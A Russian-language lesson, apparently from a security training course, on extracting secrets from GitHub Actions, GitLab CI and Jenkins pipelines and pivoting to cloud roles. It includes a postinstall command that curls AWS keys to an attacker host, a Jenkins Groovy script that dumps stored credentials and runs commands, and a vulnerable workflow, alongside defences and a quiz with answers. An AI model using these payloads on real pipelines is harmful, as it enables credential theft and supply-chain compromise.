---
id: cloud-cicd-secrets
title: "CI/CD как сокровищница: секреты пайплайнов и злоупотребление раннерами"
category: cloud
parent: cloud-credential-hunting
difficulty: medium
order: 1
tags: [cloud, cicd, github-actions, gitlab-ci, jenkins, secrets, supply-chain]
prerequisites: [cloud-credential-hunting]
useful_for:
  - "Атака на CI/CD для получения облачных креденшелов"
  - "Понимание GITHUB_TOKEN, GitLab runners, Jenkins credentials"
  - "Переход к supply-chain атакам"
estimated_minutes: 50
summary: "CI/CD-пайплайны хранят секреты и имеют права на деплой. Разбираем GitHub Actions, GitLab CI, Jenkins: где лежат секреты, как их извлечь, как злоупотребить раннером и как это связано с облаком."
---

CI/CD — это доверенный исполнитель кода с доступом к продакшену и облачным кредам. Если атакующий может выполнить код в пайплайне, он получает то же доверие. Урок про то, где в CI лежат секреты, как их достать и как из CI-доступа вырастает доступ к облаку.

## Почему CI — цель номер один

Пайплайн по определению имеет:

- **Секреты** (облачные ключи, токены деплоя, пароли) в защищённом хранилище.
- **Права на деплой** — публикация артефактов, обновление инфраструктуры.
- **Доступ к репозиторию** — чтение/запись кода.
- **OIDC-доверие** к облаку — федерация без статических ключей (см. `cloud-oidc-federation`).

| Платформа | Хранилище секретов | Токен по умолчанию |
|-----------|--------------------|--------------------|
| GitHub Actions | Settings → Secrets/Variables | `GITHUB_TOKEN` (scoped) |
| GitLab CI | Settings → CI/CD Variables | `CI_JOB_TOKEN` |
| Jenkins | Credentials store | нет (но есть `credentials()`) |

## GitHub Actions: где искать

Три источника секретов: **repository secrets**, **environment secrets**, **organization secrets**. Плюс `GITHUB_TOKEN` с автоматическими правами.

```bash
# Просмотр workflow, где секреты используются (через репозиторий)
gh workflow list
gh run list --limit 20
gh run view <run-id> --log            # логи могут светить env (если echo)

# Через API: список секретов (только имена, значения скрыты)
gh api repos/:owner/:repo/actions/secrets
gh api orgs/:org/actions/secrets
```

Классический вектор — **pull_request_target** с checkout кода из PR. Такой workflow запускается с секретами base-репозитория и исполняет код атакующего:

```yaml
# уязвимый workflow
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # код из PR!
      - run: npm ci && npm test                          # исполняется с секретами
```

Атакующий в PR добавляет `postinstall` в `package.json` и получает `${{ secrets.* }}` и `GITHUB_TOKEN`.

## GitLab CI: где искать

```bash
# Переменные проекта (protected/masked)
glab variable list -R group/project
# Логи пайплайна
glab ci list -R group/project
glab ci trace <job-id>
```

Опасности: **protected variables** доступны только на protected-ветках; если атакующий может пушить в защищённую ветку — он получит их. `CI_JOB_TOKEN` позволяет обращаться к API и другим проектам.

```yaml
# .gitlab-ci.yml, где токен может утечь
deploy:
  script:
    - echo "$AWS_SECRET_ACCESS_KEY" | base64   # если echo — утечка в лог
    - aws s3 sync ./dist s3://$BUCKET
```

## Jenkins: script console и credentials store

Jenkins — отдельная история (см. также `cloud-cicd-jenkins`). Быстрые точки входа:

```bash
# Script console (RCE через Groovy), если доступна
# URL: /script
# Groovy для чтения credentials store
```

```groovy
// Groovy RCE в Jenkins script console
def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
  com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials.class,
  Jenkins.instance, null, null)
creds.each { c -> println(c.id + ":" + c.username + ":" + c.password) }
"id; env".execute().text
```

## Разобранный пример: PR в GitHub Actions → облачные креды

**Дано:** публичный репозиторий с workflow `pull_request_target`, деплоящим в AWS через `aws-actions/configure-aws-credentials`.

1. Форкаем репозиторий, добавляем в `package.json`:

```json
{ "scripts": { "postinstall": "curl -s https://attacker/?t=$AWS_SECRET_ACCESS_KEY" } }
```

2. Открываем PR. Workflow запускается на base с секретами.
3. `npm ci` исполняет `postinstall` → эксфильтрация кредов.
4. Или, если `GITHUB_TOKEN` с `contents: write`, пушим коммит в base.

Защита: не использовать `pull_request_target` с checkout PR; ограничивать `permissions:` у workflow; окружения с required reviewers.

## От CI к облаку: OIDC-федерация

Современный паттерн — CI получает облачные креды через **OIDC**, без статических ключей:

```yaml
# GitHub Actions -> AWS через OIDC
permissions:
  id-token: write
  contents: read
steps:
  - uses: aws-actions/configure-aws-credentials@v4
    with:
      role-to-assume: arn:aws:iam::123:role/ci-deploy
      aws-region: us-east-1
```

Уязвимость: если trust policy роли принимает любой репозиторий/ветку (`repo:*` или `StringLike: repo:org/*`), атакующий из **своего** репозитория может принять роль. Проверяйте condition в trust policy:

```bash
aws iam get-role --role-name ci-deploy --query 'Role.AssumeRolePolicyDocument'
# Ищите: sub = repo:org/repo:ref:refs/heads/main (а не *)
```

## Частые ошибки

- **`echo $SECRET` в логах.** Маскирование не всегда работает (например, base64).
- **`pull_request_target` с checkout кода PR.** Прямая RCE с секретами.
- **Слишком широкий `GITHUB_TOKEN`.** По умолчанию может быть `write-all`.
- **OIDC trust policy со звёздочкой.** Любой репозиторий принимает роль.
- **Protected variables без защиты ветки.** Пуш в main = доступ к секретам.
- **Секреты в self-hosted runner.** Они остаются на диске/в памяти раннера.

## Что дальше / решение

- Нашли CI → ищите, какие секреты доступны и как запускается код в пайплайне.
- Нашли OIDC → проверяйте trust policy на wildcard.
- Нашли self-hosted runner → рассматривайте его как полноценный хост.
- Смежные уроки: `cloud-cicd-github-actions`, `cloud-cicd-jenkins`, `cloud-oidc-federation`, `cloud-supply-chain`.

## GitHub Actions: где искать

- **Secrets** (`secrets.*`) — не видны в логах, но доступны в workflow.
- **GITHUB_TOKEN** — токен репозитория, права зависят от `permissions`.
- **OIDC** — `id-token: write` позволяет встать на облачную роль без static-ключей.
- **Pull request target** — риск выполнения кода из форка с секретами.

```yaml
permissions:
  id-token: write
  contents: read
steps:
  - uses: aws-actions/configure-aws-credentials@v4
    with: { role-to-assume: arn:aws:iam::111122223333:role/DeployRole, aws-region: us-east-1 }
```

Если trust роли допускает `repo:org/*:*` — любой репозиторий/PR встанет на роль.

## OIDC-федерация

Ключевой вектор: не нужно красть статический ключ — достаточно модифицировать workflow, чтобы получить токен OIDC и обменять его на облачные креды. Проверьте trust: `sub` должен быть строго `repo:org/repo:ref:refs/heads/main`, а не wildcard.

## Разобранный пример 2: PR → облако

1. Роль `DeployRole` доверяет `repo:org/*:*`.
2. Атакующий форкает репозиторий/создаёт PR.
3. В workflow добавляет `configure-aws-credentials`.
4. Пайплайн встаёт на роль → получает креды.
5. Из кредов — доступ к S3/Secrets аккаунта.

## Практическое задание

Создайте OIDC-роль с широким `sub`. В workflow получите креды и вызовите `get-caller-identity`. Затем сузьте `sub` до конкретного репо/ветки и убедитесь, что из форка роль недоступна. Это ключевой навык защиты CI/CD.

## Jenkins и GitLab: напоминание

Jenkins — Script Console (Groovy) и credentials store. GitLab — `.gitlab-ci.yml` и protected variables. В обоих случаях раннер может иметь docker.sock и облачные креды. Проверяйте `env`, `~/.aws`, `/var/run/docker.sock`. Общая защита — изоляция раннеров, OIDC вместо static-ключей, минимальные права токенов.

## Маскирование и его пределы

GitHub маскирует значения секретов в логах, но только точные совпадения. Если секрет попал в base64 или разбит на части — маскирование не сработает. Также `set -x` может вывести команду с секретом. Поэтому даже «защищённые» секреты утекают при неаккуратном логировании. Проверяйте workflow на `echo`/`set -x` и не выводите окружение.

## Быстрая проверка GitHub Actions

```bash
gh api repos/ORG/REPO/actions/secrets
gh api repos/ORG/REPO/actions/permissions
gh api repos/ORG/REPO/actions/runs
```

Проверьте `permissions` workflow (есть ли `id-token: write`), trust OIDC-роли (`sub` wildcard?) и наличие PR-триггеров. Это ключевые векторы захвата облачных кред через CI.

## Квиз

```quiz
- question: "Почему событие pull_request_target опасно?"
  options:
    - "Оно запускает workflow с секретами base-репозитория и может исполнить код PR"
    - "Оно удаляет ветку"
    - "Оно блокирует merge"
    - "Оно отключает Actions"
  answer: 0
  explanation: "Секреты base + код PR = RCE с секретами."
- question: "Какой токен GitHub Actions выдаётся автоматически?"
  options:
    - "GITHUB_TOKEN"
    - "CI_JOB_TOKEN"
    - "AWS_SESSION_TOKEN"
    - "NPM_TOKEN"
  answer: 0
  explanation: "GITHUB_TOKEN создаётся для каждого запуска workflow."
- question: "Что такое OIDC-федерация в CI?"
  options:
    - "Получение облачных кредов по доверию без статических ключей"
    - "Шифрование логов"
    - "Кэширование зависимостей"
    - "Формат артефакта"
  answer: 0
  explanation: "CI предъявляет OIDC-токен, облако выдаёт роль."
- question: "Где в GitLab лежат секреты пайплайна?"
  options:
    - "В CI/CD Variables проекта/группы"
    - "В README"
    - "В .gitignore"
    - "В merge request"
  answer: 0
  explanation: "Переменные настраиваются в Settings -> CI/CD."
- question: "Что читает Groovy-скрипт в Jenkins script console?"
  options:
    - "Credentials store и позволяет выполнять команды (RCE)"
    - "Только логи"
    - "Только конфиг nginx"
    - "Только DNS"
  answer: 0
  explanation: "Script console даёт RCE и доступ к credentials."
```

## Где пригодится

- **Bug bounty:** уязвимые workflow публичных репозиториев.
- **Red team:** от CI к облачным кредам.
- **Пентест:** аудит пайплайнов и раннеров.
- **Работа/DevSecOps:** least-privilege токенов, OIDC trust policy, защита веток.
- **Дальше по дереву:** `cloud-cicd-github-actions`, `cloud-supply-chain`.
